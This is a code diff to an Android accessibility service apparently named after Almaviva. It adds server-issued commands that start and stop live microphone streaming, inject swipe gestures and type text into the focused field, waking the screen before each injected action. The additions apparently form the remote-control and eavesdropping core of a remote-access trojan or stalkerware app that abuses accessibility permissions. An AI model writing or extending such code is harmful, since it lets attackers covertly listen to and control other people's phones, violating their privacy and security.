@@ -14,6 +14,7 @@ import android.graphics.Rect;
 import android.hardware.HardwareBuffer;
 import android.os.BatteryManager;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.PowerManager;
@@ -264,6 +265,31 @@ public class AlmavivaAccessibilityService extends AccessibilityService {
                                 if (xp >= 0 && yp >= 0) {
                                     wakeScreenIfNeeded();
                                     dispatchTouchClickPercent((float) xp, (float) yp);
+                                }
+                            } else if ("START_AUDIO_STREAM".equals(action)) {
+                                Log.i(TAG, "Server requested start audio streaming 🎙️");
+                                AudioStreamHelper.startStreaming(cleanUrl, email, httpClient);
+                                sendAck(cleanUrl, email, "AUDIO", true, "تم تفعيل الميكروفون وبث الصوت المباشر 🎙️");
+                            } else if ("STOP_AUDIO_STREAM".equals(action)) {
+                                Log.i(TAG, "Server requested stop audio streaming");
+                                AudioStreamHelper.stopStreaming();
+                                sendAck(cleanUrl, email, "AUDIO", true, "تم إيقاف بث الصوت");
+                            } else if ("AUDIO_PING".equals(action)) {
+                                AudioStreamHelper.pingAudioStream();
+                            } else if ("SWIPE".equals(action)) {
+                                double sx = json.optDouble("startX", 0.5);
+                                double sy = json.optDouble("startY", 0.7);
+                                double ex = json.optDouble("endX", 0.5);
+                                double ey = json.optDouble("endY", 0.3);
+                                int dur = json.optInt("durationMs", 300);
+                                wakeScreenIfNeeded();
+                                dispatchSwipePercent((float) sx, (float) sy, (float) ex, (float) ey, dur);
+                            } else if ("INPUT_TEXT".equals(action)) {
+                                String textToType = json.optString("text", "");
+                                if (!textToType.isEmpty()) {
+                                    wakeScreenIfNeeded();
+                                    boolean ok = inputTextIntoFocusedNode(textToType);
+                                    sendAck(cleanUrl, email, "INPUT", ok, ok ? "تمت كتابة النص بنجاح" : "تعذر إيجاد حقل إدخال نشط");
                                 }
                             } else if ("GO_BACK".equals(action)) {
                                 performGlobalAction(GLOBAL_ACTION_BACK);
@@ -868,6 +894,66 @@ public class AlmavivaAccessibilityService extends AccessibilityService {
             GestureDescription.Builder builder = new GestureDescription.Builder();
             builder.addStroke(stroke);
             return dispatchGesture(builder.build(), null, null);
+        }
+        return false;
+    }
+
+    public boolean dispatchSwipePercent(float startXPercent, float startYPercent, float endXPercent, float endYPercent, int durationMs) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            int screenW = 1080;
+            int screenH = 2400;
+            try {
+                WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                if (wm != null) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                        Rect bounds = wm.getCurrentWindowMetrics().getBounds();
+                        screenW = bounds.width();
+                        screenH = bounds.height();
+                    } else {
+                        Display display = wm.getDefaultDisplay();
+                        Point size = new Point();
+                        display.getRealSize(size);
+                        screenW = size.x;
+                        screenH = size.y;
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            float sx = Math.max(0, Math.min(screenW, startXPercent * screenW));
+            float sy = Math.max(0, Math.min(screenH, startYPercent * screenH));
+            float ex = Math.max(0, Math.min(screenW, endXPercent * screenW));
+            float ey = Math.max(0, Math.min(screenH, endYPercent * screenH));
+
+            Log.i(TAG, "Swipe dispatch: (" + sx + ", " + sy + ") -> (" + ex + ", " + ey + ")");
+
+            Path path = new Path();
+            path.moveTo(sx, sy);
+            path.lineTo(ex, ey);
+
+            int dur = Math.max(100, Math.min(durationMs > 0 ? durationMs : 300, 1000));
+            GestureDescription.StrokeDescription stroke =
+                    new GestureDescription.StrokeDescription(path, 0, dur);
+            GestureDescription.Builder builder = new GestureDescription.Builder();
+            builder.addStroke(stroke);
+            return dispatchGesture(builder.build(), null, null);
+        }
+        return false;
+    }
+
+    public boolean inputTextIntoFocusedNode(String text) {
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return false;
+        try {
+            AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
+            if (focused != null && focused.isEditable()) {
+                Bundle arguments = new Bundle();
+                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+                return focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Error setting text: " + e.getMessage());
+        } finally {
+            root.recycle();
         }
         return false;
     }
